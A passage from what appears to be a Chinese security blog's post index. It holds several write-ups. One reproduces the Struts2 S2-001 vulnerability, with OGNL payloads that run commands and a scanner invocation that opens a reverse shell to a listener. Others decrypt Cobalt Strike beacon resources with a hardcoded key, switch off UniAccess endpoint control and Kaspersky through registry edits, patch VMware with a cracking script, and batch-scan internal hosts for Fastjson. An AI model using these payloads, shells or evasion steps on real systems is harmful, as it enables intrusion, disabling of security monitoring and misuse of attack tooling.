class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>运行/调试配置，配置好jdk/tomcat所在目录：</p><p><img src="https://z3.ax1x.com/2021/03/27/6x3AYD.png" alt="image-20210302150359586"></p><p>构建项目然后运行（可以选择D bug模式），访问web页面：</p><p><img src="https://z3.ax1x.com/2021/03/27/6x3Kmt.png" alt="image-20210302151129812"></p><h2 id="复现attack"><a href="#复现attack" class="headerlink" title="复现attack"></a>复现attack</h2><p>​    验证，password输入<code>%{6+6}</code> 提交执行返回 <code>12</code>,即表示OGNL表达式被执行，漏洞存在。</p><p><img src="https://z3.ax1x.com/2021/03/27/6x3M0P.png" alt="image-20210309225131476"></p><p>使用以下Payload执行下命令查看下web路径？</p><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()&#125;<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/03/27/6x3QTf.png" alt="image-20210309232849553"></p><p><img src="https://z3.ax1x.com/2021/03/27/6x31k8.png" alt="image-20210309233014237"></p><p>OWASP ZAP用不习惯，直接用 <code>HackBar</code> 吧：</p><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"id"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/03/27/6x3nOI.png" alt="image-20210309233928172"></p><p>使用工具</p><p><a href="https://github.com/HatBoy/Struts2-Scan" target="_blank" rel="noopener">https://github.com/HatBoy/Struts2-Scan</a></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 Struts2Scan.py -u http://localhost:8080/S2_001_war_exploded/login.action -d <span class="hljs-string">"name=admin&amp;password=&#123;exp&#125;"</span> -n <span class="hljs-string">"S02-001"</span> --<span class="hljs-built_in">exec</span><br></code></pre></td></tr></table></figure><p>漏洞存在，但不支持利用？</p><p><img src="https://z3.ax1x.com/2021/03/27/6x3rhF.png" alt="image-20210310000217881"></p><p>修改脚本1502行即可正常运行：<br><code>if name not in s2_list:</code> 为 <code> if name not in s2_dict:</code></p><p>反弹shell</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Tools/Sturts2/Struts2-Scan]<br>└─$ python3 Struts2Scan.py -u http://localhost:8080/S2_001_war_exploded/login.action -n S2-001 --reverse 192.168.176.1:8000  <br><br> ____  _              _       ____    ____                                                                              <br>/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __                                                              <br>\___ \| __| <span class="hljs-string">'__| | | | __/ __| __) | \___ \ / __/ _` | '</span>_ \                                                             <br> ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |                                                            <br>|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|                                                            <br>                                                                                                                        <br>                                      Author By HatBoy                                                                  <br>                                                                                                                        <br>[*] 请在反弹地址处监听端口如: nc -lvvp 8080<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/03/27/6x3BkT.png" alt="image-20210310002603451"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>​    略</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2007-4556 </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CsdecryptBeacon</title>
      <link href="/posts/a53b1765.html"/>
      <url>/posts/a53b1765.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://z3.ax1x.com/2021/03/27/6x3f76.png" alt="image-20210309223447383"></p><a id="more"></a><h3 id="CS-beacon资源解密"><a href="#CS-beacon资源解密" class="headerlink" title="CS beacon资源解密"></a>CS beacon资源解密</h3><p>原文 <a href="https://xz.aliyun.com/t/9224" target="_blank" rel="noopener">https://xz.aliyun.com/t/9224</a></p><p>解压 CS 核心文件 <code>cobaltstrike.jar</code> 提内容：</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir -p CSDecrypt/src<br>unzip CobaltStrike4.1/cobaltstrike.jar -d CSDecrypt/src<br><span class="hljs-built_in">cd</span> CSDecrypt/src<br>touch Csdecrypt.java<br></code></pre></td></tr></table></figure><p>解密脚本 <code>Csdecrypt.java</code> 代码：</p><figure class="hljs highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Chang Author: kali</span><br><span class="hljs-keyword">import</span> common.SleevedResource;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Csdecrypt</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">saveFile</span><span class="hljs-params">(String filename, <span class="hljs-keyword">byte</span>[] data)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">if</span> (data != <span class="hljs-keyword">null</span>) &#123;<br>            String filepath = filename;<br>            File file = <span class="hljs-keyword">new</span> File(filepath);<br>            <span class="hljs-keyword">if</span> (file.exists()) &#123;<br>                file.delete();<br>            &#125;<br>            FileOutputStream fos = <span class="hljs-keyword">new</span> FileOutputStream(file);<br>            fos.write(data, <span class="hljs-number">0</span>, data.length);<br>            fos.flush();<br>            fos.close();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] toByteArray(File f) <span class="hljs-keyword">throws</span> IOException &#123;<br>        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream((<span class="hljs-keyword">int</span>) f.length());<br>        BufferedInputStream in = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            in = <span class="hljs-keyword">new</span> BufferedInputStream(<span class="hljs-keyword">new</span> FileInputStream(f));<br>            <span class="hljs-keyword">int</span> buf_size = <span class="hljs-number">1024</span>;<br>            <span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[buf_size];<br>            <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span> (-<span class="hljs-number">1</span> != (len = in.read(buffer, <span class="hljs-number">0</span>, buf_size))) &#123;<br>                bos.write(buffer, <span class="hljs-number">0</span>, len);<br>            &#125;<br>            <span class="hljs-keyword">return</span> bos.toByteArray();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                in.close();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            bos.close();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] var0)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] csdecrypt = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">1</span>, -<span class="hljs-number">55</span>, -<span class="hljs-number">61</span>, <span class="hljs-number">127</span>, <span class="hljs-number">102</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">27</span>, -<span class="hljs-number">27</span>, -<span class="hljs-number">66</span>, <span class="hljs-number">82</span>, -<span class="hljs-number">58</span>, <span class="hljs-number">37</span>, <span class="hljs-number">92</span>, <span class="hljs-number">51</span>, <span class="hljs-number">85</span>, -<span class="hljs-number">114</span>, -<span class="hljs-number">118</span>, <span class="hljs-number">28</span>, -<span class="hljs-number">74</span>, <span class="hljs-number">103</span>, -<span class="hljs-number">53</span>, <span class="hljs-number">6</span>&#125;;<br><br>        SleevedResource.Setup(csdecrypt);<br>        <span class="hljs-keyword">byte</span>[] var7 = <span class="hljs-keyword">null</span>;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">"/home/kali/Desktop/CSDecrypt/src/sleeve"</span>);<br>        File[] fs = file.listFiles();<br><br>        <span class="hljs-keyword">for</span> (File ff : fs) &#123;<br>            <span class="hljs-keyword">if</span> (!ff.isDirectory())<br>                var7 = SleevedResource.readResource(ff.getPath());<br>            saveFile(<span class="hljs-string">"/home/kali/Desktop/CSDecrypt/src/sleevedecrypt/"</span> + ff.getName(), var7);<br>            System.out.println(<span class="hljs-string">"解密成功: "</span> + ff.getName());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Javac 编译然后执行 <code>.class</code> 文件开始解密资源：</p><figure class="hljs highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>Csdecrypt.<span class="hljs-keyword">java</span><br><span class="hljs-keyword">java </span>Csdecrypt<br></code></pre></td></tr></table></figure><p>(o゜▽゜)o☆[BINGO!]</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>禁用联软准入助手&amp;卡巴斯基</title>
      <link href="/posts/d73c51dd.html"/>
      <url>/posts/d73c51dd.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://s1.ax1x.com/2020/10/14/04356A.md.jpg"></p><a id="more"></a><p>联软准入助手太恶心，装上了它就被监控着了，而且打开一些非“正规”授权的软件都会遭受它的拦截。卡巴斯基则是把电脑中“不安全”的软件、脚本杀得片甲不留， ..@_@.. 需要把它们干掉才行！</p><p><img src="https://s1.ax1x.com/2020/10/14/041IaT.png"></p><h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><p>PE启动盘一个</p><h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><p>进PE，使用PE注册表加载系统注册表文件（不懂请自行Google），名称随意，修改前注意备份。</p><p><strong>联软准入助手</strong></p><p>注册表文件：<code>C:\Windows\System32\config\SYSTEM</code></p><p><img src="https://s1.ax1x.com/2020/10/14/041bRJ.png"></p><p>修改 <code>UniAccessAgent</code>、<code>UniAccessAgentDaemon</code>、<code>UniKInject</code> 项的 <code>Start</code> 为手动或者禁用，即3或者4：</p><p><img src="https://s1.ax1x.com/2020/10/14/041HG4.png"></p><p><strong>卡巴斯基</strong></p><p>修改 <code>AVP</code>、<code>avpsus</code>、<code>klnagent</code> 项</p><p><img src="https://s1.ax1x.com/2020/10/14/041oIU.png"></p><p>修改完，菜单点击文件－卸载配置单元，重启电脑即可。</p><p><img src="https://s1.ax1x.com/2020/10/14/0417iF.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cracked </tag>
            
            <tag> Something </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMware安装MacOS(MK-unlocker)</title>
      <link href="/posts/84701d9e.html"/>
      <url>/posts/84701d9e.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://s1.ax1x.com/2020/06/27/N6gz9g.md.png"></p><a id="more"></a><p>删除或注释 <code>win-install.cmd</code> line 9~23</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">chcp 850<br><br>net session &gt;NUL 2&gt;&amp;1<br><span class="hljs-keyword">if</span> %errorlevel% neq 0 (<br>    <span class="hljs-built_in">echo</span> Administrator privileges required! <br>    <span class="hljs-built_in">exit</span> /b<br>)<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">set</span> KeyName=<span class="hljs-string">"HKLM\SOFTWARE\Wow6432Node\VMware, Inc.\VMware Player"</span><br>:: delims is a TAB followed by a space<br><span class="hljs-keyword">for</span> /F <span class="hljs-string">"tokens=2* delims= "</span> %%A <span class="hljs-keyword">in</span> (<span class="hljs-string">'REG QUERY %KeyName% /v InstallPath'</span>) <span class="hljs-keyword">do</span> <span class="hljs-built_in">set</span> InstallPath=%%B<br><span class="hljs-built_in">echo</span> VMware is installed at: %InstallPath%<br><span class="hljs-keyword">for</span> /F <span class="hljs-string">"tokens=2* delims= "</span> %%A <span class="hljs-keyword">in</span> (<span class="hljs-string">'REG QUERY %KeyName% /v ProductVersion'</span>) <span class="hljs-keyword">do</span> <span class="hljs-built_in">set</span> ProductVersion=%%B<br><span class="hljs-built_in">echo</span> VMware product version: %ProductVersion%<br></code></pre></td></tr></table></figure><p>在line 24 添加 <code>set InstallPath=VMware安装路径</code></p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> InstallPath=C:\Program Files (x86)\VMware\VMware Workstation\<br></code></pre></td></tr></table></figure><p>在line 47、line 51改为调用python脚本破解：</p><figure class="hljs highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> unlocker.<span class="hljs-keyword">py</span><br><span class="hljs-keyword">python3</span> gettools.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><p>在line 29~line 32中的VMware服务名字是错误的，需要修改正确服务名并加上双引号</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">net stop <span class="hljs-string">"VMwareHostd"</span> &gt; NUL 2&gt;&amp;1<br>net stop <span class="hljs-string">"VMAuthdService"</span> &gt; NUL 2&gt;&amp;1<br>net stop <span class="hljs-string">"VMnetDHCP"</span> &gt; NUL 2&gt;&amp;1<br>net stop <span class="hljs-string">"VMUSBArbService"</span> &gt; NUL 2&gt;&amp;1<br>net stop <span class="hljs-string">"VMware NAT Service"</span> &gt; NUL 2&gt;&amp;1<br></code></pre></td></tr></table></figure><p>修改line 57~line 60：</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">net start <span class="hljs-string">"VMware NAT Service"</span> &gt; NUL 2&gt;&amp;1<br>net start <span class="hljs-string">"VMnetDHCP"</span> &gt; NUL 2&gt;&amp;1<br>net start <span class="hljs-string">"VMAuthdService"</span> &gt; NUL 2&gt;&amp;1<br>net start <span class="hljs-string">"VMUSBArbService"</span> &gt; NUL 2&gt;&amp;1<br>net start <span class="hljs-string">"VMwareHostd"</span> &gt; NUL 2&gt;&amp;1<br></code></pre></td></tr></table></figure><p>去除破解的 <code>win-uninstall.cmd</code> 也类似，修改相应的地方即可。</p><p><a href="https://github.com/Kuibagit/Resource/blob/master/MK-unlocker.zip" target="_blank" rel="noopener">完整脚本下载地址</a>：<a href="https://github.com/Kuibagit/Resource/blob/master/MK-unlocker.zip" target="_blank" rel="noopener">https://github.com/Kuibagit/Resource/blob/master/MK-unlocker.zip</a></p><figure class="hljs highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs cmd">@<span class="hljs-built_in">echo</span> off<br><span class="hljs-built_in">setlocal</span> ENABLEEXTENSIONS<br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Unlocker <span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> VMware Workstation<br><span class="hljs-built_in">echo</span> =====================================<br><span class="hljs-built_in">echo</span> (c) Dave Parsons <span class="hljs-number">2011</span>-<span class="hljs-number">18</span><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> encoding parameters...<br><span class="hljs-comment">REM chcp 850</span><br><br><span class="hljs-comment">REM net session &gt;NUL 2&gt;&amp;1</span><br><span class="hljs-comment">REM if %errorlevel% neq 0 (</span><br><span class="hljs-comment">    REM echo Administrator privileges required! </span><br><span class="hljs-comment">    REM pause</span><br><span class="hljs-comment">    REM exit /b</span><br><span class="hljs-comment">REM )</span><br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">set</span> InstallPath=C:\Program Files (x86)\VMware\VMware Workstation<br><span class="hljs-comment">REM set KeyName="HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\VMware, Inc.\VMware Workstation"</span><br><span class="hljs-comment">REM :: delims is a TAB followed by a space</span><br><span class="hljs-comment">REM for /F "tokens=2* delims= " %%A in ("REG.exe QUERY %KeyName% /v InstallPath") do set InstallPath=%%B</span><br><span class="hljs-comment">REM echo VMware is installed at: %InstallPath%</span><br><span class="hljs-comment">REM for /F "tokens=2* delims= " %%A in ("REG.ex QUERY %KeyName% /v ProductVersion") do set ProductVersion=%%B</span><br><span class="hljs-comment">REM echo VMware product version: %ProductVersion%</span><br><br><span class="hljs-built_in">pushd</span> %~dp0<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Stopping VMware services...<br><span class="hljs-built_in">net</span> stop "VMwareHostd" &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> stop "VMAuthdService" &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> stop "VMnetDHCP" &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> stop "VMUSBArbService" &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> stop "VMware NAT Service" &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">taskkill</span> /F /IM vmware-tray.exe &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Backing up files...<br><span class="hljs-built_in">rd</span> /s /q .\backup &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">mkdir</span> .\backup<br><span class="hljs-built_in">mkdir</span> .\backup\x64<br><span class="hljs-built_in">xcopy</span> /F /Y "<span class="hljs-variable">%InstallPath%</span>\x64\vmware-vmx.exe" .\backup\x64<br><span class="hljs-built_in">xcopy</span> /F /Y "<span class="hljs-variable">%InstallPath%</span>\x64\vmware-vmx-debug.exe" .\backup\x64<br><span class="hljs-built_in">xcopy</span> /F /Y "<span class="hljs-variable">%InstallPath%</span>\x64\vmware-vmx-stats.exe" .\backup\x64<br><span class="hljs-built_in">xcopy</span> /F /Y "<span class="hljs-variable">%InstallPath%</span>\vmwarebase.dll" .\backup\<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Patching...<br>python3 unlocker.py<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Getting VMware Tools...<br>python3 gettools.py<br><span class="hljs-built_in">xcopy</span> /F /Y .\tools\darwin*.* "<span class="hljs-variable">%InstallPath%</span>"<br><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Starting VMware services...<br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> "VMware NAT Service" &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> "VMnetDHCP" &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> "VMAuthdService" &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> "VMUSBArbService" &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span> "VMwareHostd" &gt; <span class="hljs-built_in">NUL</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br><span class="hljs-built_in">popd</span><br><span class="hljs-built_in">echo</span>.<br><span class="hljs-built_in">echo</span> Finished!<br><span class="hljs-built_in">pause</span><br></code></pre></td></tr></table></figure><p>管理员权限运行 <code>win-install.cmd</code> 破解VMware</p><p><img src="https://s1.ax1x.com/2020/06/27/N6gv4S.md.png"></p><p><img src="https://s1.ax1x.com/2020/06/27/N6gXAf.png"></p><p><strong>注意</strong></p><p>多次运行<code>win-install.cmd</code>，容易损坏VMware许可信息，损坏后需要卸载VMware再重新安装。</p><p><strong>Reference</strong></p><p><a href="https://zhuanlan.zhihu.com/p/102534602" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/102534602</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cracked </tag>
            
            <tag> Bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白嫖Xray批量检测内网Fastjson</title>
      <link href="/posts/20516be2.html"/>
      <url>/posts/20516be2.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://s1.ax1x.com/2020/06/13/tjv4Z8.jpg"></p><a id="more"></a><blockquote><p>以下简文来自于@loulan-ling师傅</p></blockquote><h3 id="白嫖xray高级版"><a href="#白嫖xray高级版" class="headerlink" title="白嫖xray高级版"></a>白嫖xray高级版</h3><p>最近又双叒叕白嫖到了xray的高级版，刚好高级版支持fastjson扫描，刚好解决了我最近工作问题（批量检测内网fastjson）。</p><p><img src="https://s1.ax1x.com/2020/06/13/tjjApR.jpg"></p><p><img src="https://s1.ax1x.com/2020/06/13/tjjFh9.jpg"></p><p>本次要用到xray高级版，xray反连平台</p><h3 id="配置xray反连平台"><a href="#配置xray反连平台" class="headerlink" title="配置xray反连平台"></a>配置xray反连平台</h3><p>首先先把xray反连平台设置好，将listen_ip修改为本地ip。</p><p><img src="https://s1.ax1x.com/2020/06/13/tjOMDO.png" alt="image.png"></p><h3 id="把当前xray所有的文件都复制到另一个xray2文件"><a href="#把当前xray所有的文件都复制到另一个xray2文件" class="headerlink" title="把当前xray所有的文件都复制到另一个xray2文件"></a>把当前xray所有的文件都复制到另一个xray2文件</h3><p><img src="https://s1.ax1x.com/2020/06/13/tjOmgx.png" alt="image.png"></p><h3 id="启动反连平台的xray"><a href="#启动反连平台的xray" class="headerlink" title="启动反连平台的xray"></a>启动反连平台的xray</h3><figure class="hljs highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">xray_windows_amd64.<span class="hljs-keyword">exe</span> <span class="hljs-built_in">reverse</span><br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/06/13/tjOnv6.png" alt="image.png"></p><h3 id="接着再启动批量扫描的xray"><a href="#接着再启动批量扫描的xray" class="headerlink" title="接着再启动批量扫描的xray"></a>接着再启动批量扫描的xray</h3><figure class="hljs highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">xray_windows_amd64</span><span class="hljs-string">.</span><span class="hljs-comment">exe</span> <span class="hljs-comment">webscan</span> --<span class="hljs-comment">plugins</span> <span class="hljs-comment">fastjson</span> --<span class="hljs-comment">url</span><span class="hljs-literal">-</span><span class="hljs-comment">file</span> <span class="hljs-comment">url</span><span class="hljs-string">.</span><span class="hljs-comment">txt</span> --<span class="hljs-comment">html</span><span class="hljs-literal">-</span><span class="hljs-comment">output</span> <span class="hljs-comment">test1</span><span class="hljs-string">.</span><span class="hljs-comment">html</span><br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/06/13/tjOKKK.png" alt="image.png"></p><h3 id="OK-扫描完成"><a href="#OK-扫描完成" class="headerlink" title="OK,扫描完成"></a>OK,扫描完成</h3><p>本次我主要是检测内网的fastjson漏洞，不涉及公网的，所以我的配置都是按照内网的设置来的，如果需要扫描公网的自行配制公网的设置就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Xray </tag>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fixed X-Forwarded for and Cracked HackBar</title>
